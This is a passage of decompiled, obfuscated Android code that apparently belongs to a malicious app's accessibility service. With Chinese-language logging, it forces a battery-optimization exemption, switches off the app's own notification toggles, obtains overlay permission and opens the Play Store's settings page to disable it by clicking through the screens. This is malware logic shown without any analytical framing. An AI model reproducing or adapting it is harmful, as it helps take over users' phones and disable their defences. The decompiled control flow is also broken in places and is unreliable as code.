                genericSteps$executeBatteryOptimization$1.f53911a0 = c0364a12;
                genericSteps$executeBatteryOptimization$1.f53912a1 = powerManager;
                genericSteps$executeBatteryOptimization$1.f53915a4 = 3;
                if (b81.m210571b1(800L, genericSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                    c0364a1 = c0364a12;
                    c0364a1.m212125a5();
                    zIsIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(c0364a1.f55048a1.getPackageName());
                    if (zIsIgnoringBatteryOptimizations) {
                    }
                    return Boolean.valueOf(zIsIgnoringBatteryOptimizations);
                }
                return coroutineSingletons;
            }
            powerManager = genericSteps$executeBatteryOptimization$1.f53912a1;
            c0364a12 = genericSteps$executeBatteryOptimization$1.f53911a0;
            kg1.m213544f4(obj);
            c0364a12.m212122a0();
            genericSteps$executeBatteryOptimization$1.f53911a0 = c0364a12;
            genericSteps$executeBatteryOptimization$1.f53912a1 = powerManager;
            genericSteps$executeBatteryOptimization$1.f53915a4 = 2;
            if (b81.m210571b1(1000L, genericSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                if (!powerManager.isIgnoringBatteryOptimizations(c0364a12.f55048a1.getPackageName())) {
                }
            }
            return coroutineSingletons;
        } catch (Exception e3) {
            e = e3;
            c0364a1 = r3;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:134:0x0269, code lost:
    
        if (p000.b81.m210571b1(300, r3) != r4) goto L139;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x00d4, code lost:
    
        if (r2.m212141c7(2000, r3) != r4) goto L49;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:119:0x0216 A[Catch: Exception -> 0x0115, TryCatch #3 {Exception -> 0x0115, blocks: (B:61:0x012d, B:51:0x00de, B:53:0x00e6, B:55:0x00f4, B:58:0x011a, B:63:0x0131, B:64:0x0138, B:66:0x0142, B:68:0x0151, B:70:0x015f, B:72:0x0165, B:78:0x018f, B:79:0x0195, B:81:0x019b, B:83:0x01a7, B:89:0x01b3, B:90:0x01b7, B:92:0x01bd, B:94:0x01c9, B:97:0x01d2, B:99:0x01d8, B:101:0x01de, B:104:0x01e6, B:108:0x01f3, B:110:0x01f9, B:112:0x0205, B:114:0x020b, B:119:0x0216, B:121:0x0221, B:120:0x021c), top: B:146:0x012d }] */
    /* JADX WARN: Removed duplicated region for block: B:120:0x021c A[Catch: Exception -> 0x0115, TryCatch #3 {Exception -> 0x0115, blocks: (B:61:0x012d, B:51:0x00de, B:53:0x00e6, B:55:0x00f4, B:58:0x011a, B:63:0x0131, B:64:0x0138, B:66:0x0142, B:68:0x0151, B:70:0x015f, B:72:0x0165, B:78:0x018f, B:79:0x0195, B:81:0x019b, B:83:0x01a7, B:89:0x01b3, B:90:0x01b7, B:92:0x01bd, B:94:0x01c9, B:97:0x01d2, B:99:0x01d8, B:101:0x01de, B:104:0x01e6, B:108:0x01f3, B:110:0x01f9, B:112:0x0205, B:114:0x020b, B:119:0x0216, B:121:0x0221, B:120:0x021c), top: B:146:0x012d }] */
    /* JADX WARN: Removed duplicated region for block: B:124:0x022f  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0247  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x01f1 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:162:0x0195 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00de A[Catch: Exception -> 0x0115, TRY_ENTER, TryCatch #3 {Exception -> 0x0115, blocks: (B:61:0x012d, B:51:0x00de, B:53:0x00e6, B:55:0x00f4, B:58:0x011a, B:63:0x0131, B:64:0x0138, B:66:0x0142, B:68:0x0151, B:70:0x015f, B:72:0x0165, B:78:0x018f, B:79:0x0195, B:81:0x019b, B:83:0x01a7, B:89:0x01b3, B:90:0x01b7, B:92:0x01bd, B:94:0x01c9, B:97:0x01d2, B:99:0x01d8, B:101:0x01de, B:104:0x01e6, B:108:0x01f3, B:110:0x01f9, B:112:0x0205, B:114:0x020b, B:119:0x0216, B:121:0x0221, B:120:0x021c), top: B:146:0x012d }] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0131 A[Catch: Exception -> 0x0115, TryCatch #3 {Exception -> 0x0115, blocks: (B:61:0x012d, B:51:0x00de, B:53:0x00e6, B:55:0x00f4, B:58:0x011a, B:63:0x0131, B:64:0x0138, B:66:0x0142, B:68:0x0151, B:70:0x015f, B:72:0x0165, B:78:0x018f, B:79:0x0195, B:81:0x019b, B:83:0x01a7, B:89:0x01b3, B:90:0x01b7, B:92:0x01bd, B:94:0x01c9, B:97:0x01d2, B:99:0x01d8, B:101:0x01de, B:104:0x01e6, B:108:0x01f3, B:110:0x01f9, B:112:0x0205, B:114:0x020b, B:119:0x0216, B:121:0x0221, B:120:0x021c), top: B:146:0x012d }] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0142 A[Catch: Exception -> 0x0115, TryCatch #3 {Exception -> 0x0115, blocks: (B:61:0x012d, B:51:0x00de, B:53:0x00e6, B:55:0x00f4, B:58:0x011a, B:63:0x0131, B:64:0x0138, B:66:0x0142, B:68:0x0151, B:70:0x015f, B:72:0x0165, B:78:0x018f, B:79:0x0195, B:81:0x019b, B:83:0x01a7, B:89:0x01b3, B:90:0x01b7, B:92:0x01bd, B:94:0x01c9, B:97:0x01d2, B:99:0x01d8, B:101:0x01de, B:104:0x01e6, B:108:0x01f3, B:110:0x01f9, B:112:0x0205, B:114:0x020b, B:119:0x0216, B:121:0x0221, B:120:0x021c), top: B:146:0x012d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Type inference failed for: r2v25 */
    /* JADX WARN: Type inference failed for: r2v27 */
    /* JADX WARN: Type inference failed for: r2v28 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:59:0x0129 -> B:146:0x012d). Please report as a decompilation issue!!! */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212132b2(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeNotificationChannel$1 genericSteps$executeNotificationChannel$1;
        C0364a1 c0364a1;
        GenericSteps$executeNotificationChannel$1 genericSteps$executeNotificationChannel$12;
        int i;
        C0364a1 c0364a12;
        int i2;
        AccessibilityNodeInfo rootInActiveWindow;
        C0364a1 c0364a13;
        boolean z;
        C0364a1 c0364a14 = this.f55048a1;
        if (continuationImpl instanceof GenericSteps$executeNotificationChannel$1) {
            genericSteps$executeNotificationChannel$1 = (GenericSteps$executeNotificationChannel$1) continuationImpl;
            int i3 = genericSteps$executeNotificationChannel$1.f53921a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                genericSteps$executeNotificationChannel$1.f53921a5 = i3 - Integer.MIN_VALUE;
            } else {
                genericSteps$executeNotificationChannel$1 = new GenericSteps$executeNotificationChannel$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeNotificationChannel$1.f53919a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = genericSteps$executeNotificationChannel$1.f53921a5;
        GenericSteps$FlowType genericSteps$FlowType = GenericSteps$FlowType.f53878a2;
        boolean z2 = false;
        try {
        } catch (Exception e) {
            e = e;
        }
        switch (i4) {
            case 0:
                kg1.m213544f4(obj);
                w20 w20Var = this.f55050a3;
                boolean zM214992a7 = w20Var.m214992a7(genericSteps$FlowType);
                String str = this.f55049a2;
                if (zM214992a7) {
                    t60.m214704c5(str, "[通知类别] 已完成，跳过");
                    return Boolean.TRUE;
                }
                if (w20Var.m214986a1(genericSteps$FlowType)) {
                    t60.m214704c5(str, "[通知类别] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                tz0.m214806a6("[通知类别] 第", w20Var.m214988a3(genericSteps$FlowType), "次尝试，打开频道设置页", str);
                try {
                    C1351vv.m214962a3(c0364a14);
                    Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                    intent.putExtra("android.provider.extra.APP_PACKAGE", c0364a14.getPackageName());
                    intent.putExtra("android.provider.extra.CHANNEL_ID", "OFF");
                    intent.setFlags(276824064);
                    c0364a14.startActivity(intent);
                    genericSteps$executeNotificationChannel$1.f53916a0 = this;
                    genericSteps$executeNotificationChannel$1.f53921a5 = 1;
                    if (b81.m210571b1(1000L, genericSteps$executeNotificationChannel$1) != coroutineSingletons) {
                        c0364a1 = this;
                        genericSteps$executeNotificationChannel$1.f53916a0 = c0364a1;
                        genericSteps$executeNotificationChannel$1.f53921a5 = 2;
                        break;
                    }
                } catch (Exception e2) {
                    e = e2;
                    c0364a14 = this;
                    tz0.m214807a7("[通知类别] 异常: ", e.getMessage(), c0364a14.f55049a2);
                    c0364a14.f55047a0.performGlobalAction(1);
                    genericSteps$executeNotificationChannel$1.f53916a0 = null;
                    genericSteps$executeNotificationChannel$1.f53921a5 = 6;
                    break;
                }
                return coroutineSingletons;
            case 1:
                c0364a1 = genericSteps$executeNotificationChannel$1.f53916a0;
                kg1.m213544f4(obj);
                genericSteps$executeNotificationChannel$1.f53916a0 = c0364a1;
                genericSteps$executeNotificationChannel$1.f53921a5 = 2;
                break;
            case 2:
                c0364a1 = genericSteps$executeNotificationChannel$1.f53916a0;
                kg1.m213544f4(obj);
                genericSteps$executeNotificationChannel$12 = genericSteps$executeNotificationChannel$1;
                i = 0;
                c0364a12 = c0364a1;
                i2 = 1;
                if (i2 < 6) {
                    try {
                        AccessibilityNodeInfo rootInActiveWindow2 = c0364a12.f55047a0.getRootInActiveWindow();
                        if (rootInActiveWindow2 != null) {
                            ArrayList arrayList = new ArrayList();
                            m212116b7(0, rootInActiveWindow2, arrayList);
                            if (!arrayList.isEmpty()) {
                                t60.m214704c5(c0364a12.f55049a2, "[通知类别] 检测到" + arrayList.size() + "个开关控件，已进入频道设置页");
                                i = 1;
                            }
                        }
                        genericSteps$executeNotificationChannel$12.f53916a0 = c0364a12;
                        genericSteps$executeNotificationChannel$12.f53917a1 = i;
                        genericSteps$executeNotificationChannel$12.f53918a2 = i2;
                        genericSteps$executeNotificationChannel$12.f53921a5 = 3;
                    } catch (Exception e3) {
                        e = e3;
                        c0364a14 = c0364a12;
                        genericSteps$executeNotificationChannel$1 = genericSteps$executeNotificationChannel$12;
                        tz0.m214807a7("[通知类别] 异常: ", e.getMessage(), c0364a14.f55049a2);
                        c0364a14.f55047a0.performGlobalAction(1);
                        genericSteps$executeNotificationChannel$1.f53916a0 = null;
                        genericSteps$executeNotificationChannel$1.f53921a5 = 6;
                        break;
                    }
                    if (b81.m210571b1(500L, genericSteps$executeNotificationChannel$12) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    i2++;
                    if (i2 < 6) {
                    }
                }
                if (i == 0) {
                    t60.m214704c5(c0364a12.f55049a2, "[通知类别] ⚠ 未进入频道设置页（未找到开关控件）");
                }
                dqtvuisjd dqtvuisjdVar = c0364a12.f55047a0;
                String str2 = c0364a12.f55049a2;
                rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    ArrayList arrayList2 = new ArrayList();
                    m212116b7(0, rootInActiveWindow, arrayList2);
                    int size = arrayList2.size();
                    int i5 = 0;
                    while (true) {
                        if (i5 < size) {
                            Object obj2 = arrayList2.get(i5);
                            i5++;
                            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) obj2;
                            if (accessibilityNodeInfo.isCheckable() && accessibilityNodeInfo.isChecked()) {
                                t60.m214704c5(str2, "[通知类别] 发现已开启的开关 (" + ((Object) accessibilityNodeInfo.getClassName()) + ")，点击关闭");
                                if (m212115a3(accessibilityNodeInfo)) {
                                    z = true;
                                }
                            }
                        } else {
                            z = false;
                        }
                    }
                    if (!z) {
                        Iterator it = dh0.f55767b7.iterator();
                        while (it.hasNext()) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                            if (!(listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty())) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                                        AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                                        int i6 = 0;
                                        while (true) {
                                            if (parent != null && i6 < 5) {
                                                AccessibilityNodeInfo accessibilityNodeInfoM212119c0 = m212119c0(parent);
                                                if (accessibilityNodeInfoM212119c0 != null && accessibilityNodeInfoM212119c0.isChecked() && m212115a3(accessibilityNodeInfoM212119c0)) {
                                                    z = true;
                                                } else {
                                                    parent = parent.getParent();
                                                    i6++;
                                                }
                                            }
                                        }
                                        if (z) {
                                            if (!z) {
                                            }
                                        }
                                    }
                                }
                                if (!z) {
                                }
                            }
                        }
                    }
                    if (!z && arrayList2.size() == 1) {
                        AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) arrayList2.get(0);
                        if ((accessibilityNodeInfo3.isChecked() || !accessibilityNodeInfo3.isCheckable()) && m212115a3(accessibilityNodeInfo3)) {
                            z2 = true;
                        }
                    }
                    z2 = z;
                }
                if (z2) {
                    t60.m214704c5(str2, "[通知类别] ⚠ 未能找到开关，标记完成");
                } else {
                    t60.m214704c5(str2, "[通知类别] ✅ 成功关闭渠道通知开关");
                }
                genericSteps$executeNotificationChannel$12.f53916a0 = c0364a12;
                genericSteps$executeNotificationChannel$12.f53921a5 = 4;
                if (b81.m210571b1(100L, genericSteps$executeNotificationChannel$12) != coroutineSingletons) {
                    c0364a13 = c0364a12;
                    genericSteps$executeNotificationChannel$1 = genericSteps$executeNotificationChannel$12;
                    c0364a13.f55050a3.m214994a9(genericSteps$FlowType);
                    c0364a13.f55047a0.performGlobalAction(1);
                    genericSteps$executeNotificationChannel$1.f53916a0 = c0364a13;
                    genericSteps$executeNotificationChannel$1.f53921a5 = 5;
                    c0364a14 = c0364a13;
                    if (b81.m210571b1(300L, genericSteps$executeNotificationChannel$1) == coroutineSingletons) {
                    }
                    return Boolean.TRUE;
                }
                return coroutineSingletons;
            case 3:
                i2 = genericSteps$executeNotificationChannel$1.f53918a2;
                int i7 = genericSteps$executeNotificationChannel$1.f53917a1;
                C0364a1 c0364a15 = genericSteps$executeNotificationChannel$1.f53916a0;
                try {
                    kg1.m213544f4(obj);
                    i = i7;
                    genericSteps$executeNotificationChannel$12 = genericSteps$executeNotificationChannel$1;
                    c0364a12 = c0364a15;
                    i2++;
                    if (i2 < 6) {
                    }
                    if (i == 0) {
                    }
                    dqtvuisjd dqtvuisjdVar2 = c0364a12.f55047a0;
                    String str22 = c0364a12.f55049a2;
                    rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                    }
                    if (z2) {
                    }
                    genericSteps$executeNotificationChannel$12.f53916a0 = c0364a12;
                    genericSteps$executeNotificationChannel$12.f53921a5 = 4;
                    if (b81.m210571b1(100L, genericSteps$executeNotificationChannel$12) != coroutineSingletons) {
                    }
                } catch (Exception e4) {
                    e = e4;
                    c0364a14 = c0364a15;
                    tz0.m214807a7("[通知类别] 异常: ", e.getMessage(), c0364a14.f55049a2);
                    c0364a14.f55047a0.performGlobalAction(1);
                    genericSteps$executeNotificationChannel$1.f53916a0 = null;
                    genericSteps$executeNotificationChannel$1.f53921a5 = 6;
                    break;
                }
                return coroutineSingletons;
            case 4:
                C0364a1 c0364a16 = genericSteps$executeNotificationChannel$1.f53916a0;
                kg1.m213544f4(obj);
                c0364a13 = c0364a16;
                c0364a13.f55050a3.m214994a9(genericSteps$FlowType);
                c0364a13.f55047a0.performGlobalAction(1);
                genericSteps$executeNotificationChannel$1.f53916a0 = c0364a13;
                genericSteps$executeNotificationChannel$1.f53921a5 = 5;
                c0364a14 = c0364a13;
                if (b81.m210571b1(300L, genericSteps$executeNotificationChannel$1) == coroutineSingletons) {
                }
                return Boolean.TRUE;
            case 5:
                C0364a1 c0364a17 = genericSteps$executeNotificationChannel$1.f53916a0;
                kg1.m213544f4(obj);
                c0364a14 = c0364a17;
                return Boolean.TRUE;
            case 6:
                kg1.m213544f4(obj);
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:62:0x0112, code lost:
    
        if (r15 != r3) goto L64;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00db  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00dc A[Catch: Exception -> 0x0055, PHI: r1
      0x00dc: PHI (r1v9 ??) = (r1v13 ??), (r1v14 ??) binds: [B:49:0x00d9, B:26:0x0050] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0055, blocks: (B:26:0x0050, B:51:0x00dc, B:55:0x00eb, B:57:0x00f4, B:31:0x005b, B:48:0x00d0, B:34:0x0061, B:45:0x00c3), top: B:71:0x0029 }] */
    /* JADX WARN: Removed duplicated region for block: B:53:0x00e6  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x00e9  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00f4 A[Catch: Exception -> 0x0055, TRY_LEAVE, TryCatch #2 {Exception -> 0x0055, blocks: (B:26:0x0050, B:51:0x00dc, B:55:0x00eb, B:57:0x00f4, B:31:0x005b, B:48:0x00d0, B:34:0x0061, B:45:0x00c3), top: B:71:0x0029 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v13 */
    /* JADX WARN: Type inference failed for: r0v14 */
    /* JADX WARN: Type inference failed for: r0v2 */
    /* JADX WARN: Type inference failed for: r0v3, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* JADX WARN: Type inference failed for: r0v5 */
    /* JADX WARN: Type inference failed for: r0v9 */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r1v1 */
    /* JADX WARN: Type inference failed for: r1v13 */
    /* JADX WARN: Type inference failed for: r1v14 */
    /* JADX WARN: Type inference failed for: r1v9, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* renamed from: b3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212133b3(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeOverlayPermission$1 genericSteps$executeOverlayPermission$1;
        C0364a1 c0364a1;
        C0364a1 c0364a12;
        Object objM212126a6;
        boolean zCanDrawOverlays;
        C0364a1 c0364a13;
        ?? r0 = "[悬浮窗] 最终状态: ";
        ?? r1 = "package:";
        if (continuationImpl instanceof GenericSteps$executeOverlayPermission$1) {
            genericSteps$executeOverlayPermission$1 = (GenericSteps$executeOverlayPermission$1) continuationImpl;
            int i = genericSteps$executeOverlayPermission$1.f53925a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                genericSteps$executeOverlayPermission$1.f53925a3 = i - Integer.MIN_VALUE;
            } else {
                genericSteps$executeOverlayPermission$1 = new GenericSteps$executeOverlayPermission$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeOverlayPermission$1.f53923a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = genericSteps$executeOverlayPermission$1.f53925a3;
        GenericSteps$FlowType genericSteps$FlowType = GenericSteps$FlowType.f53879a3;
        try {
            try {
            } catch (Exception e) {
                e = e;
            }
        } catch (Exception e2) {
            e = e2;
            r0 = r1;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            Context context = this.f55048a1;
            boolean zCanDrawOverlays2 = Settings.canDrawOverlays(context);
            w20 w20Var = this.f55050a3;
            String str = this.f55049a2;
            if (zCanDrawOverlays2) {
                t60.m214704c5(str, "[悬浮窗] 已有悬浮窗权限");
                w20Var.m214994a9(genericSteps$FlowType);
                return Boolean.TRUE;
            }
            tz0.m214806a6("[悬浮窗] 开始执行 (尝试", w20Var.m214988a3(genericSteps$FlowType), "/2)", str);
            try {
                t60.m214704c5(str, "[悬浮窗] 打开悬浮窗权限设置页面...");
                Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.setFlags(276824064);
                context.startActivity(intent);
                genericSteps$executeOverlayPermission$1.f53922a0 = this;
                genericSteps$executeOverlayPermission$1.f53925a3 = 1;
                if (b81.m210571b1(2500L, genericSteps$executeOverlayPermission$1) != coroutineSingletons) {
                    c0364a1 = this;
                }
                return coroutineSingletons;
            } catch (Exception e3) {
                e = e3;
                r0 = this;
                tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), r0.f55049a2);
                return Boolean.FALSE;
            }
        }
        if (i2 == 1) {
            C0364a1 c0364a14 = genericSteps$executeOverlayPermission$1.f53922a0;
            kg1.m213544f4(obj);
            c0364a1 = c0364a14;
        } else {
            if (i2 == 2) {
                C0364a1 c0364a15 = genericSteps$executeOverlayPermission$1.f53922a0;
                kg1.m213544f4(obj);
                c0364a12 = c0364a15;
                genericSteps$executeOverlayPermission$1.f53922a0 = c0364a12;
                genericSteps$executeOverlayPermission$1.f53925a3 = 3;
                objM212126a6 = c0364a12.m212126a6(0, genericSteps$executeOverlayPermission$1);
                r1 = c0364a12;
                if (objM212126a6 == coroutineSingletons) {
                    zCanDrawOverlays = Settings.canDrawOverlays(r1.f55048a1);
                    t60.m214704c5(r1.f55049a2, "[悬浮窗] 最终状态: ".concat(!zCanDrawOverlays ? "已授权" : "未授权"));
                    if (zCanDrawOverlays) {
                    }
                    return Boolean.FALSE;
                }
                return coroutineSingletons;
            }
            if (i2 == 3) {
                C0364a1 c0364a16 = genericSteps$executeOverlayPermission$1.f53922a0;
                kg1.m213544f4(obj);
                r1 = c0364a16;
                zCanDrawOverlays = Settings.canDrawOverlays(r1.f55048a1);
                t60.m214704c5(r1.f55049a2, "[悬浮窗] 最终状态: ".concat(!zCanDrawOverlays ? "已授权" : "未授权"));
                if (zCanDrawOverlays) {
                    r1.f55050a3.m214994a9(genericSteps$FlowType);
                    r1.m212138c2();
                    genericSteps$executeOverlayPermission$1.f53922a0 = r1;
                    genericSteps$executeOverlayPermission$1.f53925a3 = 4;
                    if (b81.m210571b1(300L, genericSteps$executeOverlayPermission$1) != coroutineSingletons) {
                        c0364a13 = r1;
                        genericSteps$executeOverlayPermission$1.f53922a0 = c0364a13;
                        genericSteps$executeOverlayPermission$1.f53925a3 = 5;
                        Object objM212140c5 = c0364a13.m212140c5(genericSteps$executeOverlayPermission$1);
                        r0 = c0364a13;
                    }
                    return coroutineSingletons;
                }
                return Boolean.FALSE;
            }
            if (i2 != 4) {
                if (i2 != 5) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                C0364a1 c0364a17 = genericSteps$executeOverlayPermission$1.f53922a0;
                kg1.m213544f4(obj);
                r0 = c0364a17;
                return Boolean.TRUE;
            }
            C0364a1 c0364a18 = genericSteps$executeOverlayPermission$1.f53922a0;
            kg1.m213544f4(obj);
            c0364a13 = c0364a18;
            genericSteps$executeOverlayPermission$1.f53922a0 = c0364a13;
            genericSteps$executeOverlayPermission$1.f53925a3 = 5;
            Object objM212140c52 = c0364a13.m212140c5(genericSteps$executeOverlayPermission$1);
            r0 = c0364a13;
        }
        genericSteps$executeOverlayPermission$1.f53922a0 = c0364a1;
        genericSteps$executeOverlayPermission$1.f53925a3 = 2;
        Object objM212141c7 = c0364a1.m212141c7(2000L, genericSteps$executeOverlayPermission$1);
        c0364a12 = c0364a1;
        if (objM212141c7 != coroutineSingletons) {
            genericSteps$executeOverlayPermission$1.f53922a0 = c0364a12;
            genericSteps$executeOverlayPermission$1.f53925a3 = 3;
            objM212126a6 = c0364a12.m212126a6(0, genericSteps$executeOverlayPermission$1);
            r1 = c0364a12;
            if (objM212126a6 == coroutineSingletons) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:112:0x016b A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:55:0x00eb A[Catch: Exception -> 0x003e, TryCatch #0 {Exception -> 0x003e, blocks: (B:15:0x0039, B:86:0x01b8, B:90:0x01ce, B:27:0x005c, B:52:0x00df, B:53:0x00e5, B:55:0x00eb, B:60:0x0101, B:58:0x00fb, B:30:0x0065, B:49:0x00cf), top: B:100:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x013b A[Catch: Exception -> 0x0054, TryCatch #5 {Exception -> 0x0054, blocks: (B:22:0x004f, B:64:0x012f, B:65:0x0135, B:67:0x013b, B:72:0x0151, B:82:0x01a4, B:70:0x014b, B:73:0x016b, B:74:0x016f, B:76:0x0175, B:81:0x018b, B:79:0x0185), top: B:110:0x004f }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x01ce A[Catch: Exception -> 0x003e, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x003e, blocks: (B:15:0x0039, B:86:0x01b8, B:90:0x01ce, B:27:0x005c, B:52:0x00df, B:53:0x00e5, B:55:0x00eb, B:60:0x0101, B:58:0x00fb, B:30:0x0065, B:49:0x00cf), top: B:100:0x002b }] */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r1v13, types: [com.storm.safe.rock.service.modules.yw5xud.a1, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r1v17, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212134b4(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executePlayStoreDisable$1 genericSteps$executePlayStoreDisable$1;
        boolean z;
        C0364a1 c0364a1;
        String str;
        C0364a1 c0364a12;
        String str2;
        List list;
        Iterator it;
        Context context = this.f55048a1;
        C0364a1 c0364a13 = this.f55049a2;
        if (continuationImpl instanceof GenericSteps$executePlayStoreDisable$1) {
            genericSteps$executePlayStoreDisable$1 = (GenericSteps$executePlayStoreDisable$1) continuationImpl;
            int i = genericSteps$executePlayStoreDisable$1.f53931a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                genericSteps$executePlayStoreDisable$1.f53931a5 = i - Integer.MIN_VALUE;
            } else {
                genericSteps$executePlayStoreDisable$1 = new GenericSteps$executePlayStoreDisable$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executePlayStoreDisable$1.f53929a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = genericSteps$executePlayStoreDisable$1.f53931a5;
        boolean z2 = false;
        try {
        } catch (Exception e) {
            e = e;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                context.getPackageManager().getApplicationInfo("com.android.vending", 0);
                try {
                    ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo("com.android.vending", 0);
                    t60.m214694b5(applicationInfo, "context.packageManager.getApplicationInfo(pkg, 0)");
                    z = !applicationInfo.enabled;
                } catch (Exception unused) {
                    z = false;
                }
                if (z) {
                    t60.m214704c5(c0364a13, "[PlayStore] 已禁用，跳过");
                    return Boolean.TRUE;
                }
                int i3 = this.f55052a5;
                if (i3 >= 2) {
                    t60.m214704c5(c0364a13, "[PlayStore] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                int i4 = i3 + 1;
                this.f55052a5 = i4;
                tz0.m214806a6("[PlayStore] 开始禁用 (尝试", i4, "/2)", c0364a13);
                try {
                    Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent.setData(Uri.parse("package:com.android.vending"));
                    intent.setFlags(276824064);
                    context.startActivity(intent);
                    genericSteps$executePlayStoreDisable$1.f53926a0 = this;
                    genericSteps$executePlayStoreDisable$1.f53927a1 = "com.android.vending";
                    genericSteps$executePlayStoreDisable$1.f53931a5 = 1;
                    if (b81.m210571b1(2500L, genericSteps$executePlayStoreDisable$1) != coroutineSingletons) {
                        c0364a1 = this;
                        str = "com.android.vending";
                    }
                    return coroutineSingletons;
                } catch (Exception e2) {
                    e = e2;
                    c0364a13 = this;
                    tz0.m214807a7("[PlayStore] 异常: ", e.getMessage(), c0364a13.f55049a2);
                    return Boolean.FALSE;
                }
            } catch (Exception unused2) {
                t60.m214704c5(c0364a13, "[PlayStore] 未安装，跳过");
                return Boolean.TRUE;
            }
        }
        if (i2 != 1) {
            if (i2 == 2) {
                str = genericSteps$executePlayStoreDisable$1.f53927a1;
                C0364a1 c0364a14 = genericSteps$executePlayStoreDisable$1.f53926a0;
                kg1.m213544f4(obj);
                c0364a13 = c0364a14;
                List<String> list2 = dh0.f55760b0;
                for (String str3 : list2) {
                    AccessibilityNodeInfo rootInActiveWindow = c0364a13.f55047a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null ? false : c0364a13.m212124a4(rootInActiveWindow, str3)) {
                        t60.m214704c5(c0364a13.f55049a2, "[PlayStore] 点击'" + str3 + "'成功");
                        genericSteps$executePlayStoreDisable$1.f53926a0 = c0364a13;
                        genericSteps$executePlayStoreDisable$1.f53927a1 = str;
                        genericSteps$executePlayStoreDisable$1.f53928a2 = list2;
                        genericSteps$executePlayStoreDisable$1.f53931a5 = 3;
                        if (b81.m210571b1(800L, genericSteps$executePlayStoreDisable$1) != coroutineSingletons) {
                            c0364a12 = c0364a13;
